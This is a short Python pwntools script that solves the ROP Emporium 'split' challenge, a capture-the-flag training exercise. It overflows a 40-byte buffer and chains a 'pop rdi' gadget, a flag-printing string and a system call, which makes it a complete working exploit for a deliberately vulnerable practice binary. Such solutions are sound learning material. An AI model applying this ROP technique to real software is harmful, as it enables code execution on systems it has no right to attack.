# ROPE{a_placeholder_32byte_flag!}
# https://ropemporium.com/challenge/split.html
# pwn0x80.github.io
from pwn import *

elf = ELF("split")
f_rop = ROP(elf)
# system
p = process(elf.path)
sys = int(elf.symbols.usefulFunction) + 9
sys = p64(sys)


# cat
cat = p64(elf.symbols.usefulString)

# rop
pop = p64((f_rop.find_gadget(['pop rdi', 'ret']))[
    0])  # Same as ROPgadget --binary vul

raw_input('gdb mode')

payload = b'A'*40 + pop + cat + sys


p.sendline(payload)
a = p.recv()
print(a)
a = p.recv()
print(a)


p.interactive()
